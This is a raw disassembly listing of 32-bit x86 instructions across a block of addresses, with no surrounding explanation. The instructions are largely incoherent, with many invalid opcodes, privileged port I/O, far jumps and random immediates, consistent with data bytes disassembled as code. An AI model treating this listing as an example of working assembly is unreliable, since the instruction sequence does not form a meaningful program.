  41f199:	shr    DWORD PTR [ebx-0x2ba64082],1
  41f19f:	inc    edx
  41f1a0:	push   es
  41f1a1:	dec    ebx
  41f1a2:	les    edi,FWORD PTR [edx-0x1a]
  41f1a5:	push   ebx
  41f1a6:	sub    al,BYTE PTR [edi-0x4d]
  41f1a9:	add    edi,ecx
  41f1ab:	adc    BYTE PTR [edx-0x6],al
  41f1ae:	or     eax,0xc5ce081
  41f1b3:	mov    ecx,0x2577075c
  41f1b8:	push   0xffffffd2
  41f1ba:	add    BYTE PTR [ebx],cl
  41f1bc:	rcl    DWORD PTR [ebp-0x6e],cl
  41f1bf:	retf   0x7d94
  41f1c2:	cwde   
  41f1c3:	sar    BYTE PTR ds:0xa865f5af,0x14
  41f1ca:	mov    eax,ds:0x623f683e
  41f1cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f1d0:	mov    esp,0x942c0a38
  41f1d5:	mov    ds:0x7c95e2,al
  41f1da:	mov    al,ds:0xe7522871
  41f1df:	dec    eax
  41f1e0:	cld    
  41f1e1:	call   0x76098029
  41f1e6:	pop    edx
  41f1e7:	xor    BYTE PTR [edx],0xfc
  41f1ea:	xchg   ebp,eax
  41f1eb:	retf   0xb9ef
  41f1ee:	xor    dh,BYTE PTR [esi+0x5c]
  41f1f1:	es cmp BYTE PTR cs:[ebx],0xa2
  41f1f6:	xchg   edi,eax
  41f1f7:	std    
  41f1f8:	adc    BYTE PTR [edx-0x2cb976a8],al
  41f1fe:	mov    esi,0xf72fb8ad
  41f203:	dec    esp
  41f204:	int3   
  41f205:	jp     0x41f19f
  41f207:	pop    ebp
  41f208:	mov    al,0x7c
  41f20a:	mov    bl,0xb1
  41f20c:	push   ebx
  41f20d:	les    ecx,FWORD PTR [ecx+0x647e9e77]
  41f213:	add    BYTE PTR [ebp+0x4e],0x80
  41f217:	push   cs
  41f218:	jns    0x41f259
  41f21a:	test   DWORD PTR [eax+0x16],ebx
  41f21d:	xlat   BYTE PTR ds:[ebx]
  41f21e:	test   DWORD PTR [ebp-0x56],ecx
  41f221:	mov    esp,0xb51e4b42
  41f226:	cld    
  41f227:	stos   DWORD PTR es:[edi],eax
  41f228:	dec    ecx
  41f229:	lock pop esi
  41f22b:	xor    BYTE PTR [edx],ah
  41f22d:	cmc    
  41f22e:	fst    DWORD PTR [ebp+ebp*8-0x34]
  41f232:	loop   0x41f287
  41f234:	pop    eax
  41f235:	mov    al,ds:0x87c4a052
  41f23a:	jg     0x41f290
  41f23c:	test   al,0xf2
  41f23e:	cmp    cl,0x67
  41f241:	fwait
  41f242:	in     al,dx
  41f243:	lea    eax,[eax+0x24]
  41f246:	jl     0x41f2b3
  41f248:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f249:	nop
  41f24a:	or     BYTE PTR [edx],al
  41f24c:	or     al,0xdf
  41f24e:	or     al,0x22
  41f250:	(bad)  
  41f251:	pop    ebp
  41f252:	mov    BYTE PTR [eax+edi*8-0x57],0xce
  41f257:	xor    al,0x1d
  41f259:	dec    edx
  41f25a:	out    0xb0,eax
  41f25c:	mov    ebp,0x856ba942
  41f261:	call   0xa8:0xe2bc8eb3
  41f268:	adc    eax,0xdcd1da5e
  41f26d:	and    bh,dl
  41f26f:	sar    BYTE PTR ds:0x2264f040,0xbf
  41f276:	dec    ebp
  41f277:	out    dx,al
  41f278:	scas   al,BYTE PTR es:[edi]
  41f279:	pop    esp
  41f27a:	(bad)  
  41f27c:	cdq    
  41f27d:	mov    eax,0xacbcea84
  41f282:	aam    0x8b
  41f284:	in     eax,0x7d
  41f286:	test   ch,ch
  41f288:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f289:	imul   BYTE PTR [edi+0x71]
  41f28c:	sti    
  41f28d:	sub    al,0x9
  41f28f:	rdmsr  
  41f291:	or     al,0xdc
  41f293:	in     al,dx
  41f294:	lahf   
  41f295:	aas    
  41f296:	jbe    0x41f2eb
  41f298:	mov    esi,0x6d9d03ca
  41f29d:	pusha  
  41f29e:	stc    
  41f29f:	int    0xb3
  41f2a1:	mov    ebp,0x3af24740
  41f2a6:	gs (bad) 
  41f2a8:	xchg   edx,eax
  41f2a9:	(bad)  
  41f2aa:	inc    eax
  41f2ab:	leave  
  41f2ac:	add    DWORD PTR [ebx-0x71],0x55
  41f2b0:	push   ebx
  41f2b1:	push   ebx
  41f2b2:	sbb    eax,0xe116dfee
  41f2b7:	mov    ah,0xad
  41f2b9:	(bad)  
  41f2ba:	adc    eax,0xe14fc519
  41f2bf:	mov    bh,0xd0
  41f2c1:	push   ss
  41f2c2:	ror    BYTE PTR [ecx-0x4c],0x28
  41f2c6:	ds icebp 
  41f2c8:	cmp    BYTE PTR ds:0xc346e38a,dh
  41f2ce:	adc    eax,0xdf49bd60
  41f2d3:	mov    BYTE PTR [edx+0x5],0x22
  41f2d7:	aad    0x17
  41f2d9:	repnz mov edi,0x45122317
  41f2df:	xchg   ebx,eax
  41f2e0:	mov    dh,0xe1
  41f2e2:	adc    bh,al
  41f2e4:	inc    eax
  41f2e5:	mov    ecx,0x4bab48b
  41f2ea:	mov    ds:0x91b12952,eax
  41f2ef:	call   0xaed78873
  41f2f4:	mov    edx,0x2dfb4190
  41f2f9:	cmp    BYTE PTR [edi+0x76e70902],al
  41f2ff:	mov    ebp,0x8e724cba
  41f304:	jo     0x41f365
  41f306:	inc    esp
  41f307:	outs   dx,DWORD PTR ds:[esi]
  41f308:	lods   eax,DWORD PTR ds:[esi]
  41f309:	fimul  WORD PTR [esi]
  41f30b:	test   DWORD PTR [eax],edi
  41f30d:	pushf  
  41f30e:	push   0x2e7585f1
  41f313:	idiv   cl
  41f315:	push   0x51e9ddea
  41f31a:	nop
  41f31b:	aaa    
  41f31c:	in     al,0xb5
  41f31e:	scas   al,BYTE PTR es:[edi]
  41f31f:	arpl   WORD PTR [eax-0x6b0f2294],si
  41f325:	test   ebx,ebx
  41f327:	add    BYTE PTR [esi],al
  41f329:	xor    BYTE PTR [ebx],ah
  41f32b:	and    DWORD PTR [ecx-0x6a],edi
  41f32e:	mov    BYTE PTR [esi-0x22],dl
  41f331:	add    ebp,0xffffff9c
  41f334:	mov    al,0x0
  41f336:	mov    ebp,esi
  41f338:	add    DWORD PTR [eax],esp
  41f33a:	jno    0x41f2d1
  41f33c:	test   DWORD PTR [eax],esi
  41f33e:	add    eax,DWORD PTR [esi+0x2c]
  41f341:	retf   
  41f342:	lds    esi,FWORD PTR [edx]
  41f344:	mov    edx,0x75343788
  41f349:	xor    DWORD PTR [ebx+0x2b],esp
  41f34c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f34d:	jecxz  0x41f317
  41f34f:	cld    
  41f350:	lds    esi,FWORD PTR [ebp-0x2d8a1ebc]
  41f356:	test   BYTE PTR [eax+ebp*1-0x46e088a4],al
  41f35d:	fld    TBYTE PTR [ebx+ebp*8-0x57]
  41f361:	sbb    eax,0x4c736b15
  41f366:	and    bh,dl
  41f368:	aad    0x1f
  41f36a:	push   esi
  41f36b:	hlt    
  41f36c:	fs pop esp
  41f36e:	fnstenv [edx-0x6b]
  41f371:	cs pmaddwd mm7,mm4
  41f375:	inc    esi
  41f376:	inc    edx
  41f377:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f378:	push   ss
  41f379:	pop    esp
  41f37a:	jnp    0x41f354
  41f37c:	jo     0x41f323
  41f37e:	icebp  
  41f37f:	fistp  WORD PTR [ebx+edx*4-0x4bfa888]
  41f386:	retf   
  41f387:	ds aaa 
  41f389:	push   es
  41f38a:	pop    edi
  41f38b:	fmul   DWORD PTR [ebx-0x4dd7d2df]
  41f391:	pop    esi
  41f392:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f393:	(bad)
  41f397:	mov    ds:0x82cd8ef3,al
  41f39c:	leave  
  41f39d:	cmp    ebx,DWORD PTR [ecx+0xc67597e]
  41f3a3:	mov    ecx,DWORD PTR [ebx+0x369eef37]
  41f3a9:	xor    ecx,esi
  41f3ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f3ac:	jmp    0x290a:0x8b746494
  41f3b3:	lods   al,BYTE PTR ds:[esi]
  41f3b4:	and    eax,0xf449c999
  41f3b9:	sbb    DWORD PTR [ebx+edx*8-0x32],ebp
  41f3bd:	hlt    
  41f3be:	cmp    BYTE PTR [ebp-0x6605de43],dl
  41f3c4:	pop    ecx
  41f3c5:	icebp  
  41f3c6:	jb     0x41f430
  41f3c8:	stos   DWORD PTR es:[edi],eax
  41f3c9:	push   0x4d191646
  41f3ce:	lahf   
  41f3cf:	pop    esi
  41f3d0:	xor    al,0x3b
  41f3d2:	faddp  st(5),st
  41f3d4:	jle    0x41f40d
  41f3d6:	jmp    0x41f419
  41f3d8:	or     ebx,DWORD PTR [edi+0x7e84bfcc]
  41f3de:	outs   dx,BYTE PTR ds:[esi]
  41f3df:	(bad)  
  41f3e0:	sar    DWORD PTR [ebp+0x473f2a97],cl
  41f3e6:	not    edi
  41f3e8:	retf   0x44cc
  41f3eb:	repnz xor BYTE PTR [edi+ebp*8+0x65ccffe9],al
  41f3f3:	dec    esp
  41f3f4:	rol    ebp,0x33
  41f3f7:	xchg   edi,eax
  41f3f8:	outs   dx,BYTE PTR ds:[esi]
  41f3f9:	js     0x41f3b8
  41f3fb:	mov    dl,0xba
  41f3fd:	ret    0x6579
  41f400:	pop    edx
  41f401:	dec    ecx
  41f402:	clc    
  41f403:	dec    edi
  41f404:	lahf   
  41f405:	ins    BYTE PTR es:[edi],dx
  41f406:	aam    0x86
  41f408:	add    eax,0xb5c76e6e
  41f40d:	or     eax,esp
  41f40f:	jle    0x41f477
  41f411:	(bad)  
  41f412:	xor    bl,BYTE PTR [edi+0x0]
  41f415:	and    al,bh
  41f417:	mov    ebx,0x58124b14
  41f41c:	inc    edx
  41f41d:	enter  0xf0a9,0x13
  41f421:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f422:	sub    eax,0xa42f1edb
  41f427:	cmp    eax,0xf9997e43
  41f42c:	sub    dl,cl
  41f42e:	mov    ah,0x12
  41f430:	cmp    esi,DWORD PTR [esi]
  41f432:	shr    DWORD PTR [edx],1
  41f434:	jnp    0x41f49e
  41f436:	aaa    
  41f437:	imul   DWORD PTR ds:0x3bac9a46
  41f43d:	sbb    ch,BYTE PTR [esi]
  41f43f:	add    edx,esp
  41f441:	call   FWORD PTR [esi-0x31]
  41f444:	dec    ecx
  41f445:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f446:	cmp    bh,BYTE PTR [eax-0x74]
  41f449:	push   0xf387d38c
  41f44e:	hlt    
  41f44f:	ins    BYTE PTR es:[edi],dx
  41f450:	lds    ebx,FWORD PTR [edi+edi*4-0x6a]
  41f454:	ret    0x43ee
  41f457:	sbb    edi,DWORD PTR [ebp-0x6d]
  41f45a:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  41f45c:	scas   eax,DWORD PTR es:[edi]
  41f45d:	clc    
  41f45e:	xchg   edi,eax
  41f45f:	jno    0x41f470
  41f461:	pusha  
  41f462:	or     cl,dh
  41f464:	pop    ecx
  41f465:	out    0xf2,al
  41f467:	daa    
  41f468:	lahf   
  41f469:	in     eax,dx
  41f46a:	clc    
  41f46b:	pop    ecx
  41f46c:	adc    eax,0x2a42c3f3
  41f471:	pop    edi
  41f472:	ss mov edi,0x4870c6b1
  41f478:	daa    
  41f479:	or     al,0xd2
  41f47b:	mov    WORD PTR ds:0x5ee7b6b3,?
  41f481:	or     BYTE PTR [ebx],al
  41f483:	in     al,0x62
  41f485:	lea    eax,[edx-0x7d6fa595]
  41f48b:	(bad)  
  41f48e:	(bad)  [eax]
  41f490:	sub    BYTE PTR [ebx],dh
  41f492:	mov    eax,0x65bad31
  41f497:	in     eax,0xe3
  41f499:	sbb    DWORD PTR [ebx-0x7b],0xcd8682c2
  41f4a0:	push   es
  41f4a1:	fidivr WORD PTR [edi-0x74da8a0e]
  41f4a7:	stos   BYTE PTR es:[edi],al
  41f4a8:	and    esi,DWORD PTR [ebp+0x67]
  41f4ab:	gs push ds
  41f4ad:	test   BYTE PTR [edi+0x7d43ca54],al
  41f4b3:	arpl   cx,dx
  41f4b5:	clc    
  41f4b6:	jmp    0x41f4c0
  41f4b8:	sahf   
  41f4b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f4ba:	in     eax,dx
  41f4bb:	dec    ecx
  41f4bc:	adc    bl,ah
  41f4be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f4bf:	add    al,0xf6
  41f4c1:	push   ebp
  41f4c2:	lods   al,BYTE PTR ds:[esi]
  41f4c3:	ja     0x41f46b
  41f4c5:	lods   eax,DWORD PTR ds:[esi]
  41f4c6:	shl    BYTE PTR [eax+0x5c75a623],0x72
  41f4cd:	js     0x41f46b
  41f4cf:	das    
  41f4d0:	ins    DWORD PTR es:[edi],dx
  41f4d1:	into   
  41f4d2:	add    eax,0xeccca0cd
  41f4d7:	call   0x81e2:0xe7ac2584
  41f4de:	adc    bl,BYTE PTR [edi-0x336fa58]
  41f4e4:	jnp    0x41f4da
  41f4e6:	int3   
  41f4e7:	les    esi,FWORD PTR [ecx]
  41f4e9:	rcr    BYTE PTR [ecx-0x10],1
  41f4ec:	frstor [esp+ebp*4]
  41f4ef:	add    ah,BYTE PTR [eax-0x69]
  41f4f2:	mov    ch,0x41
  41f4f4:	inc    ecx
  41f4f5:	call   0x391c37bc
  41f4fa:	mov    dl,0x7b
  41f4fd:	cs jnp 0x41f49a
  41f500:	and    BYTE PTR [ebp-0x46b23b39],ah
  41f506:	and    eax,0x119e8e8
  41f50b:	inc    ecx
  41f50c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f50d:	mov    esp,esp
  41f50f:	test   DWORD PTR [edi+0x4f0b48bc],edi
  41f515:	mov    bl,0x5f
  41f517:	int    0xc3
  41f519:	mov    eax,0x731e959a
  41f51e:	adc    edx,DWORD PTR [ecx+esi*8]
  41f521:	arpl   WORD PTR [esi+0x5a],bp
  41f524:	push   cs
  41f525:	fs fcmovnu st,st(4)
  41f528:	pop    ss
  41f529:	mov    esp,?
  41f52b:	xchg   edi,eax
  41f52c:	daa    
  41f52d:	int3   
  41f52e:	dec    esi
  41f52f:	mov    edi,DWORD PTR ds:0xac51dd83
  41f535:	addr16 mov ecx,0x656e5cca
  41f53b:	sub    al,0x25
  41f53d:	pop    ecx
  41f53e:	das    
  41f53f:	rcr    dl,0xe3
  41f542:	out    dx,al
  41f543:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f544:	pop    ss
  41f545:	loopne 0x41f523
  41f547:	mov    ah,0xc
  41f549:	sub    al,0xfc
  41f54b:	stos   DWORD PTR es:[edi],eax
  41f54c:	outs   dx,DWORD PTR ds:[esi]
  41f54d:	mov    bl,0x26
  41f54f:	or     edi,DWORD PTR [ecx+0x6a1370]
  41f555:	retf   
  41f556:	(bad)  
  41f557:	aad    0xac
  41f559:	in     al,0x97
  41f55b:	mov    WORD PTR [eax],gs
  41f55d:	push   0xffffffaa
  41f55f:	stos   BYTE PTR es:[edi],al
  41f560:	xchg   ecx,eax
  41f561:	cmp    esp,eax
  41f563:	test   al,0x6b
  41f565:	sub    DWORD PTR [ecx+0x3c],esi
  41f568:	loopne 0x41f554
  41f56a:	fsincos 
  41f56c:	sar    DWORD PTR [ebp+0x28],1
  41f56f:	sbb    BYTE PTR [ecx-0x7b],0x6e
  41f573:	(bad)  
  41f574:	cmp    eax,0x6340372b
  41f579:	retf   
  41f57a:	pop    es
  41f57b:	out    0x86,al
  41f57d:	push   esp
  41f57e:	aaa    
  41f57f:	sahf   
  41f580:	enter  0xf3f6,0xdd
  41f584:	inc    edi
  41f585:	pop    esi
  41f586:	mov    ah,0x83
  41f588:	and    eax,0x207a8a26
  41f58d:	int    0x81
  41f58f:	outs   dx,DWORD PTR ds:[esi]
  41f590:	shl    BYTE PTR [edi],0x18
  41f593:	scas   al,BYTE PTR es:[edi]
  41f594:	xchg   ecx,eax
  41f595:	nop
  41f596:	inc    ebp
  41f597:	or     BYTE PTR [esi+0x77662b7d],0xb1
  41f59e:	mov    eax,ds:0x4f3d8289
  41f5a3:	das    
  41f5a4:	mov    edx,0x8dbf7099
  41f5a9:	xor    eax,0x3085e37e
  41f5ae:	cmp    eax,0x3b4e3108
  41f5b3:	mov    ecx,0xa19f9315
  41f5b8:	out    0x45,al
  41f5ba:	fdiv   QWORD PTR [eax-0x50]
  41f5bd:	sub    al,0xe6
  41f5bf:	push   eax
  41f5c0:	mov    eax,ecx
  41f5c2:	xlat   BYTE PTR ds:[ebx]
  41f5c3:	and    DWORD PTR [ecx+0x6c],edi
  41f5c6:	xchg   ecx,eax
  41f5c7:	xchg   ebx,edi
  41f5c9:	and    DWORD PTR [esi],0xe60f2a53
  41f5cf:	dec    esp
  41f5d0:	sub    eax,DWORD PTR [eax+0x53]
  41f5d3:	nop
  41f5d4:	dec    esp
  41f5d5:	push   ds
  41f5d6:	cmp    al,0x99
  41f5d8:	fs mov ecx,0x63cc30a
  41f5de:	xor    DWORD PTR [ecx-0x46700c03],0x88b053e6
  41f5e8:	jnp    0x41f5ec
  41f5ea:	scas   eax,DWORD PTR es:[edi]
  41f5eb:	inc    ch
  41f5ed:	jg     0x41f5d6
  41f5ef:	cmp    eax,0x6d06a303
  41f5f4:	jns    0x41f663
  41f5f6:	xchg   ebp,eax
  41f5f7:	xchg   DWORD PTR [edx+0x23],esp
  41f5fa:	test   DWORD PTR [ebp-0x3f],ebx
  41f5fd:	xchg   esi,eax
  41f5fe:	cli    
  41f5ff:	and    al,0x79
  41f601:	fldenv ds:0xa759b415
  41f607:	lock fs adc ch,0x8f
  41f60c:	mov    al,ds:0xecde9533
  41f611:	push   esi
  41f612:	cld    
  41f613:	jmp    0x41f683
  41f615:	or     dh,dh
  41f617:	mov    WORD PTR [eax-0x4fa2ddb0],cs
  41f61d:	loop   0x41f642
  41f61f:	cmp    ebp,ebp
  41f621:	icebp  
  41f622:	outs   dx,BYTE PTR ds:[esi]
  41f623:	test   al,0xa0
  41f625:	dec    eax
  41f626:	mov    ebx,0x3d7d721d
  41f62b:	cmp    al,0xe4
  41f62d:	(bad)  
  41f62e:	xor    cl,BYTE PTR [edi]
  41f630:	test   eax,edi
  41f632:	loop   0x41f612
  41f634:	xchg   ecx,eax
  41f635:	test   BYTE PTR [eax+0x60d235e5],0x3c
  41f63c:	mov    ecx,0x2c4c5e05
  41f641:	fwait
  41f642:	sbb    edi,DWORD PTR [edx]
  41f644:	adc    al,0x9c
  41f646:	xchg   DWORD PTR ds:[edx],eax
  41f649:	ficomp DWORD PTR [edi+0x1f8e71c9]
  41f64f:	stos   BYTE PTR es:[edi],al
  41f650:	xor    eax,0x7bc95b23
  41f655:	pop    eax
  41f656:	and    esp,DWORD PTR [ebx-0x1d9e11f6]
  41f65c:	jp     0x41f6d0
  41f65e:	cmp    BYTE PTR [ecx+0x4d],cl
  41f661:	or     ebp,DWORD PTR ss:[ebx+eax*4]
  41f665:	inc    ebp
  41f666:	xor    al,BYTE PTR [edx+0x4]
  41f669:	jmp    0x8f65:0xe6c1deb5
  41f670:	nop
  41f671:	in     eax,dx
  41f672:	adc    eax,0x1f5a9e22
  41f677:	and    al,BYTE PTR [ebp+ebp*8+0x3b]
  41f67b:	mov    ah,0xfb
  41f67d:	dec    edx
  41f67e:	adc    DWORD PTR [edx],0xffffffc5
  41f681:	ficomp WORD PTR [esi+0x63e062da]
  41f687:	in     al,dx
  41f688:	cmovb  edi,DWORD PTR [esi]
  41f68b:	mov    ds:0x4aa3d9c1,al
  41f690:	sbb    ebp,ebx
  41f692:	push   0xffffffb4
  41f694:	mov    esp,0xe2db2aa
  41f699:	fcomp  QWORD PTR [ebx]
  41f69b:	xlat   BYTE PTR ds:[ebx]
  41f69c:	jns    0x41f672
  41f69e:	mov    edi,0x8ddeecde
  41f6a3:	sbb    eax,0x67a9cb7
  41f6a8:	out    0x6,al
  41f6aa:	cld    
  41f6ab:	test   al,0x70
  41f6ad:	xchg   ecx,eax
  41f6ae:	aad    0xad
  41f6b0:	aaa    
  41f6b1:	mov    ebp,0x131dbf42
  41f6b6:	inc    ecx
  41f6b7:	mov    ds:0x85bef0c0,eax
  41f6bc:	pop    edx
  41f6bd:	test   eax,0xf351adc2
  41f6c2:	mov    es,WORD PTR ds:0xbe4cca2e
  41f6c8:	les    edi,FWORD PTR [edx-0x7e6ad2]
  41f6ce:	xlat   BYTE PTR ds:[ebx]
  41f6cf:	das    
  41f6d0:	mov    esp,?
  41f6d2:	ja     0x41f6f4
  41f6d4:	outs   dx,BYTE PTR ds:[esi]
  41f6d5:	jns    0x41f706
  41f6d7:	repz js 0x41f756
  41f6da:	push   esp
  41f6db:	iret   
  41f6dc:	inc    eax
  41f6dd:	cmp    esp,DWORD PTR [ebx+0x1c]
  41f6e0:	pop    ecx
  41f6e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f6e2:	ins    DWORD PTR es:[edi],dx
  41f6e3:	inc    eax
  41f6e4:	add    al,0x34
  41f6e6:	out    0x53,eax
  41f6e8:	std    
  41f6e9:	push   eax
  41f6ea:	jecxz  0x41f6f0
  41f6ec:	shl    BYTE PTR [ebp-0x422a3e94],1
  41f6f2:	pop    es
  41f6f3:	inc    edx
  41f6f4:	in     al,dx
  41f6f5:	pop    eax
  41f6f6:	jg     0x41f68f
  41f6f8:	push   eax
  41f6f9:	call   0xbc6a:0x6ed14124
  41f700:	xchg   esi,eax
  41f701:	and    DWORD PTR [esi-0x69c05ebe],eax
  41f707:	jle    0x41f691
  41f709:	shr    DWORD PTR [edx],1
  41f70b:	pop    eax
  41f70c:	and    ch,ah
  41f70e:	pop    edx
  41f70f:	imul   bx,ax,0xb3dd
  41f714:	xor    BYTE PTR [edx],dh
  41f716:	aad    0xfd
  41f718:	cmp    esi,0xffffffde
  41f71b:	in     eax,dx
  41f71c:	inc    ebp
  41f71d:	neg    ch
  41f71f:	add    BYTE PTR [esp+esi*1],0xdf
  41f723:	mov    ds:0x39691d5c,al
  41f728:	push   cs
  41f729:	hlt    
  41f72a:	fsubr  DWORD PTR [esi+0x37]
  41f72d:	xchg   DWORD PTR [ecx-0x5d],esi
  41f730:	lods   eax,DWORD PTR ds:[esi]
  41f731:	push   ds
  41f732:	jecxz  0x41f736
  41f734:	arpl   WORD PTR [edi-0x51653b96],si
  41f73a:	iret   
  41f73b:	int    0xcd
  41f73d:	push   edi
  41f73e:	mov    dl,0xa3
  41f740:	ss pop ss
  41f742:	pop    ds
  41f743:	jp     0x41f6ec
  41f745:	add    edx,DWORD PTR [esi+0x54]
  41f748:	(bad)  
  41f749:	data16 or dh,BYTE PTR [edi+ebx*4-0x4b37d32f]
  41f751:	jbe    0x41f7a0
  41f753:	cs or  eax,0xa3d93af
  41f759:	in     eax,dx
  41f75a:	out    0x32,eax
  41f75c:	jg     0x41f7b8
  41f75e:	scas   eax,DWORD PTR es:[edi]
  41f75f:	sbb    eax,0x688e7a59
  41f764:	push   esi
  41f765:	aad    0xc4
  41f767:	mov    esi,0x1835d48d
  41f76c:	inc    edi
  41f76d:	jnp    0x41f795
  41f76f:	stos   BYTE PTR es:[edi],al
  41f770:	jle    0x41f742
  41f772:	dec    eax
  41f773:	cs push esp
  41f775:	cmp    al,0x12
  41f777:	push   0xfffffffd
  41f779:	mov    esi,DWORD PTR [eax]
  41f77b:	in     eax,0x42
  41f77d:	mov    ebp,0x5130bf8
  41f782:	stc    
  41f783:	adc    eax,0xfc76bd1f
  41f788:	scas   al,BYTE PTR es:[edi]
  41f789:	dec    edi
  41f78a:	sbb    bh,BYTE PTR [edx]
  41f78c:	dec    esi
  41f78d:	test   eax,0xdf016847
  41f792:	push   0xffffff8e
  41f794:	(bad)  
  41f795:	retf   0x2e5a
  41f798:	mov    DWORD PTR [ebx],edx
  41f79a:	lods   eax,DWORD PTR ds:[esi]
  41f79b:	leave  
  41f79c:	(bad)  
  41f79d:	es out dx,al
  41f79f:	fiadd  DWORD PTR [edi+0x706dd966]
  41f7a5:	out    0x75,eax
  41f7a7:	sbb    cl,BYTE PTR [eax+0x6ddb311]
  41f7ad:	(bad)  
  41f7ae:	call   0x65c8ced1
  41f7b3:	out    dx,eax
  41f7b4:	dec    esp
  41f7b5:	(bad)  
  41f7b6:	push   esi
  41f7b7:	nop
  41f7b8:	inc    ebp
  41f7b9:	out    dx,eax
  41f7ba:	gs pop edi
  41f7bc:	mov    bh,0xbb
  41f7be:	or     BYTE PTR [esi+0x18],bl
  41f7c1:	out    0xfd,al
  41f7c3:	mov    ebp,DWORD PTR [esp+edx*1-0x34a055c]
  41f7ca:	loope  0x41f79d
  41f7cc:	aam    0x2d
  41f7ce:	xchg   esi,eax
  41f7cf:	xor    bh,BYTE PTR [ebx]
  41f7d1:	mov    esi,0x56f9594f
  41f7d6:	ret    0x6818
  41f7d9:	pop    edi
  41f7da:	addr16 pop esp
  41f7dc:	dec    edx
  41f7dd:	aad    0x87
  41f7df:	mov    cl,0x2e
  41f7e1:	inc    ebp
  41f7e2:	add    al,0x9f
  41f7e4:	jmp    0x1030:0x2857fcd
  41f7eb:	xlat   BYTE PTR ds:[ebx]
  41f7ec:	add    BYTE PTR [edx],0x4d
  41f7ef:	pop    ebx
  41f7f0:	or     DWORD PTR [ecx+edx*8],edx
  41f7f3:	dec    ebx
  41f7f4:	lds    ecx,FWORD PTR [edi+0x11fe9acf]
  41f7fa:	sbb    al,0x7d
  41f7fc:	and    al,0xd9
  41f7fe:	shl    BYTE PTR es:[edx+0x77f03740],cl
  41f805:	cmp    BYTE PTR [esi+eax*4+0x76],al
  41f809:	or     eax,0x762284fe
  41f80e:	and    dh,cl
  41f810:	popf   
  41f811:	add    eax,0xba3fd987
  41f816:	or     al,0xc5
  41f818:	rol    eax,0x32
  41f81b:	dec    edx
  41f81c:	test   BYTE PTR ds:0x6dc413be,bh
  41f822:	or     BYTE PTR [ecx-0x3e64589a],dh
  41f828:	push   ecx
  41f829:	mov    DWORD PTR [esi],ebx
  41f82b:	pop    ss
  41f82c:	mov    al,0xe3
  41f82e:	jno    0x41f813
  41f830:	repnz pop ebx
  41f832:	ss cmp al,0xc6
  41f835:	mov    ch,0x73
  41f837:	dec    edi
  41f838:	inc    esp
  41f839:	shl    BYTE PTR [edx],1
  41f83b:	std    
  41f83c:	jp     0x41f80b
  41f83e:	xor    al,0x96
  41f840:	(bad)  
  41f841:	and    eax,ecx
  41f843:	daa    
  41f844:	mov    eax,0xd2e7f3e7
  41f849:	jns    0x41f825
  41f84b:	jne    0x41f83d
  41f84d:	test   BYTE PTR [edi],cl
  41f84f:	mov    bl,0x2b
  41f851:	cmp    edx,DWORD PTR [edi+edx*2]
  41f854:	jmp    0x41f826
  41f856:	jmp    0x88032ec1
  41f85b:	adc    DWORD PTR [edi-0x4a58a6e1],ecx
  41f861:	mov    al,ds:0x8de90e15
  41f867:	push   ebx
  41f868:	add    dh,BYTE PTR [eax+0x42]
  41f86b:	mov    bl,BYTE PTR [ecx-0x83c8cd4]
  41f871:	inc    edx
  41f872:	xor    al,0x7b
  41f874:	adc    BYTE PTR [edi+0x31],0x13
  41f878:	push   ecx
  41f879:	mov    ebx,0x609e67bf
  41f87f:	xor    ecx,edx
  41f881:	xchg   edi,eax
  41f882:	jnp    0x41f854
  41f884:	int    0xcb
  41f886:	xchg   ebp,eax
  41f887:	cmc    
  41f888:	lahf   
  41f889:	dec    edi
  41f88a:	inc    edi
  41f88b:	out    0xf1,eax
  41f88d:	clc    
  41f88e:	xchg   ebp,eax
  41f88f:	mov    WORD PTR [eax],fs
  41f891:	push   ss
  41f892:	adc    eax,0x4cf91ecf
  41f897:	add    BYTE PTR cs:[ebx+0x769dd1d7],0x7c
  41f89f:	vpand  ymm2,ymm1,YMMWORD PTR [ecx]
  41f8a3:	pop    ds
  41f8a4:	and    ebx,edx
  41f8a6:	push   cs
  41f8a7:	and    eax,0x484b8c76
  41f8ac:	cld    
  41f8ad:	and    DWORD PTR [ebp+0xbf9f75b],edi
  41f8b3:	ja     0x41f87d
  41f8b5:	(bad)  
  41f8b6:	jmp    0x2741:0xbb531f36
  41f8bd:	push   ds
  41f8be:	call   0x464bb97
  41f8c3:	and    ebx,DWORD PTR [eax-0x13ee21fe]
  41f8c9:	inc    edx
  41f8ca:	icebp  
  41f8cb:	mov    bh,0x4d
  41f8cd:	inc    edi
  41f8ce:	and    DWORD PTR fs:[esi-0x38],edx
  41f8d2:	mov    dl,0xf3
  41f8d4:	dec    DWORD PTR [edi]
  41f8d6:	out    0x63,eax
  41f8d8:	xchg   si,ax
  41f8da:	push   es
  41f8db:	sbb    ebp,DWORD PTR [eax]
  41f8dd:	xor    ch,BYTE PTR [edi]
  41f8df:	push   eax
  41f8e0:	or     dh,BYTE PTR [edi+0x23c77940]
  41f8e6:	inc    esi
  41f8e7:	mov    ss,WORD PTR [ebx]
  41f8e9:	arpl   WORD PTR [esi],dx
  41f8eb:	xor    BYTE PTR [ebp*4+0x1f77b5cb],dl
  41f8f2:	push   ecx
  41f8f3:	bound  ebx,QWORD PTR [edx-0x54]
  41f8f6:	push   ds
  41f8f7:	fidivr DWORD PTR [edi+0x48]
  41f8fa:	mov    eax,ds:0x32db2b7e
  41f8ff:	xchg   esp,eax
  41f900:	ins    DWORD PTR es:[edi],dx
  41f901:	jne    0x41f8e1
  41f903:	xchg   ebp,eax
  41f904:	shl    DWORD PTR ss:[edx+0x13bacd58],1
  41f90b:	sub    dh,BYTE PTR ds:0xf26a42d2
  41f911:	pushf  
